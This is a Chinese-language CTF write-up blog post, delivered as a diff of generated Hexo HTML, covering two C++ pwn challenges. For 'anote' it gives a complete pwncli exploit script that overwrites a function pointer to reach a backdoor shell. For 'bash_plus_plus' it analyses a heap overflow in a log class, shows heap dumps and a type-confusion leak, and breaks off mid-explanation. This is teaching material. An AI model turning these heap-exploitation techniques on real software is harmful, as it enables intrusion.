@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="lakectf2024和长城杯&amp;ciscn的几个cpp的题#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwncpp">
+<meta property="og:url" content="http://example.com/2024/12/19/pwncpp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="lakectf2024和长城杯&amp;ciscn的几个cpp的题#">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-12-19T02:08:50.000Z">
+<meta property="article:modified_time" content="2024-12-19T03:53:05.053Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2024/12/19/pwncpp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>pwncpp | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/19/pwncpp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwncpp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-12-19 10:08:50 / Modified: 11:53:05" itemprop="dateCreated datePublished" datetime="2024-12-19T10:08:50+08:00">2024-12-19</time>
+            </span>
+
+          
+            <div class="post-description">lakectf2024和长城杯&ciscn的几个cpp的题#</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="anote"><a href="#anote" class="headerlink" title="anote"></a>anote</h1><p>堆溢出，这个反编译挺恶心的</p>
+<p>允许创建9个chunk</p>
+<p>有add，show，和edit</p>
+<p>洞在edit，允许最多输入0x28，同时edit结束后会调用堆块中某个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::istream::getline(&amp;std::cin, &amp;src, 0x20);</span><br><span class="line">sub_8048A86(*(&amp;v25 + v20), &amp;src, v20, n);</span><br><span class="line">(***(&amp;v25 + v20))(*(&amp;v25 + v20));</span><br></pre></td></tr></table></figure>
+
+<p>show给泄露堆地址</p>
+<p>add创建0x20大小的chunk</p>
+<p>调用函数正好在chunk的fd处</p>
+<p>先用show泄露堆基址，再通过chunk0覆写chunk1的调用函数的地址，程序内部有backdoor</p>
+<p>将backdoor的地址写到chunk0内</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from hashlib import shake_128</span><br><span class="line">from pwncli import *</span><br><span class="line"></span><br><span class="line">cli_script()  # 使用脚本模式必须显式调用这个函数</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line"># 你能够从gift里面取到很多东西</span><br><span class="line">io = gift[&quot;io&quot;]  # process或remote对象</span><br><span class="line">elf = gift[&quot;elf&quot;]  # ELF对象，ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = gift.libc  # ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">rop = gift.rop  # ROP对象</span><br><span class="line"></span><br><span class="line">filename = gift.filename  # current filename</span><br><span class="line">is_debug = gift.debug  # is debug or not</span><br><span class="line">is_remote = gift.remote  # is remote or not</span><br><span class="line">gdb_pid = gift.gdb_pid  # gdb pid if debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uu64 = lambda: u64(ru(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br><span class="line">if gift.remote:</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    gift[&quot;libc&quot;] = libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add():</span><br><span class="line">    sla(&quot;Choice&gt;&gt;&quot;, &quot;1&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(&quot;Choice&gt;&gt;&quot;, &quot;2&quot;)</span><br><span class="line">    sla(&quot;index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, len, content):</span><br><span class="line">    sla(&quot;Choice&gt;&gt;&quot;, &quot;3&quot;)</span><br><span class="line">    sla(&quot;index: &quot;, str(idx))</span><br><span class="line">    sla(&quot;len: &quot;, str(len))</span><br><span class="line">    sla(&quot;content: &quot;, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell = 0x80489CE</span><br><span class="line">add()</span><br><span class="line">show(0)</span><br><span class="line">ru(&quot;gift: 0x&quot;)</span><br><span class="line">shell_addr = int(io.recvuntil(&quot;\n&quot;, drop=True), 16)</span><br><span class="line">log_address_ex(&quot;shell_addr&quot;)</span><br><span class="line">add()</span><br><span class="line">payload = p32(shell) + b&quot;a&quot; * 0xC + p32(0) + p32(0x21) + p32(shell_addr + 8)</span><br><span class="line"></span><br><span class="line">edit(0, 0x1C, payload)</span><br><span class="line">edit(1, 1, &quot;a&quot;)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+
+<h1 id="bash-plus-plus"><a href="#bash-plus-plus" class="headerlink" title="bash_plus_plus"></a>bash_plus_plus</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>lakectf的题，给了源码，直接看源码就行</p>
+<p>模拟了一个bash，可用<code>$a=123</code>或<code>$a=abc</code>这种格式设置变量，变量结构如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">enum TYPE &#123;</span><br><span class="line">    LONG,</span><br><span class="line">    STRING</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class Variable &#123;</span><br><span class="line">    public:</span><br><span class="line">        TYPE type;</span><br><span class="line">        union &#123;</span><br><span class="line">            long l;</span><br><span class="line">            char* s;</span><br><span class="line">        &#125; value;</span><br><span class="line">        </span><br><span class="line">        Variable(long l) : type(LONG) &#123;</span><br><span class="line">            value.l = l;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Variable(const char* s) : type(STRING) &#123;</span><br><span class="line">            value.s = strdup(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        virtual void print() &#123;</span><br><span class="line">            std::cout &lt;&lt; &quot;Default print&quot; &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class longVariable : public Variable &#123;</span><br><span class="line">    public:</span><br><span class="line">        longVariable(long l) : Variable(l) &#123;&#125;</span><br><span class="line">        void print() override &#123;</span><br><span class="line">            std::cout &lt;&lt; value.l &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class stringVariable : public Variable &#123;</span><br><span class="line">    public:</span><br><span class="line">        stringVariable(const char* s) : Variable(s) &#123;&#125;</span><br><span class="line">        void print() override &#123;</span><br><span class="line">            std::cout &lt;&lt; value.s &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>变量有TYPE，可以是STRING和LONG，有print这个打印函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">void setvar(const char* name, const char* p) &#123;</span><br><span class="line">    char *strval;</span><br><span class="line">    long longval = std::strtol(p + 1, &amp;strval, 10);</span><br><span class="line"></span><br><span class="line">    if (*strval) &#123;</span><br><span class="line">        variables[name] = new stringVariable(strval);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        variables[name] = new longVariable(longval);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    variables[name]-&gt;print();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$(($a+$b))</code>用这种格式来进行计算</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">void process_arithmetic(char* cmd) &#123;</span><br><span class="line">    char *p = std::strchr(cmd, &#x27;)&#x27;);</span><br><span class="line"></span><br><span class="line">    if (!p) &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;Invalid command&quot; &lt;&lt; std::endl;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *p = 0;</span><br><span class="line"></span><br><span class="line">    char *op = std::strchr(cmd, &#x27;+&#x27;);</span><br><span class="line">    long a, b;</span><br><span class="line">    if (op) &#123;</span><br><span class="line">        *op = 0;</span><br><span class="line">        a = getLongVar(cmd+1);</span><br><span class="line">        b = getLongVar(op + 2);</span><br><span class="line">        std::cout &lt;&lt; a + b &lt;&lt; std::endl;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        op = std::strchr(cmd, &#x27;-&#x27;);</span><br><span class="line">        if (op) &#123;</span><br><span class="line">            *op = 0;</span><br><span class="line">            a = getLongVar(cmd+1);</span><br><span class="line">            b = getLongVar(op + 2);</span><br><span class="line">            std::cout &lt;&lt; a - b &lt;&lt; std::endl;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            op = std::strchr(cmd, &#x27;*&#x27;);</span><br><span class="line">            if (op) &#123;</span><br><span class="line">                *op = 0;</span><br><span class="line">                a = getLongVar(cmd+1);</span><br><span class="line">                b = getLongVar(op + 2);</span><br><span class="line">                std::cout &lt;&lt; a * b &lt;&lt; std::endl;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                op = std::strchr(cmd+1, &#x27;/&#x27;);</span><br><span class="line">                if (op) &#123;</span><br><span class="line">                    *op = 0;</span><br><span class="line">                    a = getLongVar(cmd+1);</span><br><span class="line">                    b = getLongVar(op + 2);</span><br><span class="line">                    std::cout &lt;&lt; a / b &lt;&lt; std::endl;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    std::cout &lt;&lt; &quot;Invalid operation&quot; &lt;&lt; std::endl;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果是STRING，会打印出对应字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">long getLongVar(const char* name) &#123;</span><br><span class="line">    Variable* v = getvarbyname(name);</span><br><span class="line">    if (v-&gt;type == LONG) &#123;</span><br><span class="line">        return v-&gt;value.l;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;Invalid variable &quot; &lt;&lt; name &lt;&lt; &quot;: &quot; &lt;&lt; v-&gt;value.s &lt;&lt; std::endl;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还可以用log来创建新的log</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">while (true) &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;&gt; &quot;;</span><br><span class="line">        char cmd[20];</span><br><span class="line">        std::cin &gt;&gt; cmd;</span><br><span class="line"></span><br><span class="line">        if (cmd[0] == &#x27;$&#x27;) &#123;</span><br><span class="line">            if (cmd[1] == &#x27;(&#x27; &amp;&amp; cmd[2] == &#x27;(&#x27;) &#123;</span><br><span class="line">                process_arithmetic(cmd + 3);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                char* p = std::strchr(cmd, &#x27;=&#x27;);</span><br><span class="line">                if (p) &#123;</span><br><span class="line">                    *p = 0;</span><br><span class="line">                    setvar(cmd + 1, p);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    Variable* c_v = getvarbyname(cmd + 1);  </span><br><span class="line">                    c_v -&gt; print();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (!strcmp(cmd, &quot;log&quot;)) &#123;</span><br><span class="line">            std::cout &lt;&lt; &quot;Creating new log&quot; &lt;&lt; std::endl;</span><br><span class="line">            log = new Log();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            std::cout &lt;&lt; cmd &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (log-&gt;get_size() &gt;= MAX_LOG_SIZE) &#123;</span><br><span class="line">            log-&gt;reset_log();</span><br><span class="line">        &#125;</span><br><span class="line">        log-&gt;add_cmd_to_log(cmd);</span><br><span class="line">        log-&gt;increase_size();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞也就在这，<code>log-&gt;add_cmd_to_log()</code>并不是一次读取1字节，而他的size增长确实一次只+1，而MAX_LOG_SIZE为10，也就是允许读入10次20字节的数据，很明显这会造成堆溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class Log &#123;</span><br><span class="line">    private:</span><br><span class="line">        int size;</span><br><span class="line">        char logs[MAX_LOG_SIZE];</span><br><span class="line"></span><br><span class="line">    public:</span><br><span class="line">        Log() &#123;</span><br><span class="line">            size = 0;</span><br><span class="line">            memset(logs, 0, MAX_LOG_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int get_size() &#123;</span><br><span class="line">            return size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        void increase_size() &#123;</span><br><span class="line">            size++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        void add_cmd_to_log(const char* cmd) &#123;</span><br><span class="line">            strcat(logs, cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        void reset_log() &#123;</span><br><span class="line">            memset(logs, 0, MAX_LOG_SIZE);</span><br><span class="line">            size = 0;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *v</span><br><span class="line">$1 = &#123;</span><br><span class="line">  _vptr.Variable = 0x55555555cbe8 &lt;vtable for longVariable+16&gt;,</span><br><span class="line">  type = LONG,</span><br><span class="line">  value = &#123;</span><br><span class="line">    l = 123,</span><br><span class="line">    s = 0x7b &lt;error: Cannot access memory at address 0x7b&gt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分别用<code>$a=12345</code>和<code>$a=abcd</code>来对比堆块分配</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x555555570b00: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555555570b10: 0x000055555555cbe8      0x0000000000000000</span><br><span class="line">0x555555570b20: 0x0000000000003039      0x0000000000000051</span><br><span class="line">0x555555570b30: 0x0000000000000001      0x000055555555d288</span><br><span class="line">0x555555570b40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555570b50: 0x0000555555570b60      0x0000000000000001</span><br><span class="line">0x555555570b60: 0x0000000000000061      0x0000000000000000</span><br><span class="line">0x555555570b70: 0x0000555555570b10      0x000000000000e491</span><br><span class="line">$a=12345</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x555555570b00: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555555570b10: 0x000055555555cbd0      0x0000000000000001</span><br><span class="line">0x555555570b20: 0x0000555555570b30      0x0000000000000021</span><br><span class="line">0x555555570b30: 0x0000000064636261      0x0000000000000000</span><br><span class="line">0x555555570b40: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x555555570b50: 0x0000000000000001      0x000055555555d288</span><br><span class="line">0x555555570b60: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555570b70: 0x0000555555570b80      0x0000000000000001</span><br><span class="line">0x555555570b80: 0x0000000000000061      0x0000000000000000</span><br><span class="line">0x555555570b90: 0x0000555555570b10      0x000000000000e471</span><br><span class="line">$a=abcd</span><br></pre></td></tr></table></figure>
+
+<p>先创建一个0x20的chunk，用来存放print的虚表和type和值</p>
+<p>STRING会再创建一个0x20的chunk来存放字符串</p>
+<p>两者最后都创建一个0x50的chunk，来指向变量名和指向值</p>
+<p>之后新建chunk会链接两个chunk，在0x555555570b40~0x555555570b48处，第三个chunk会导致0x000055555555d288来到第二个chunk，以后不改变，这些对于该题目并不重要</p>
+<p>重点在于创建log也会新建一个0x20的chunk，可以覆写chunk0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x555555570ae0: 0x0000000000000000      0x0000000000000021	#log</span><br><span class="line">0x555555570af0: 0x24676f6c00000002      0x0000000000000061</span><br><span class="line">0x555555570b00: 0x0000000000000000      0x0000000000000021	#chunk0</span><br><span class="line">0x555555570b10: 0x000055555555cbe8      0x0000000000000000</span><br><span class="line">0x555555570b20: 0x000000000000007b      0x0000000000000051</span><br><span class="line">0x555555570b30: 0x0000000000000001      0x000055555555d288</span><br><span class="line">0x555555570b40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555570b50: 0x0000555555570b60      0x0000000000000001</span><br><span class="line">0x555555570b60: 0x0000000000000061      0x0000000000000000</span><br><span class="line">0x555555570b70: 0x0000555555570b10      0x000000000000e491</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们完全可以覆写chunk0的vtable和type，但本题没有给出pie和堆基址，我们还需泄露</p>
+<p>观察</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">long getLongVar(const char* name) &#123;</span><br><span class="line">    Variable* v = getvarbyname(name);</span><br><span class="line">    if (v-&gt;type == LONG) &#123;</span><br><span class="line">        return v-&gt;value.l;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;Invalid variable &quot; &lt;&lt; name &lt;&lt; &quot;: &quot; &lt;&lt; v-&gt;value.s &lt;&lt; std::endl;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>LONG类型的是直接输出值，而STRING是打印出字符串指针指向的字符串，如果我们将type从STRING改为LONG，那就可以获取字符串指针，而字符串指针是在堆上的，也就获得了堆基址</p>
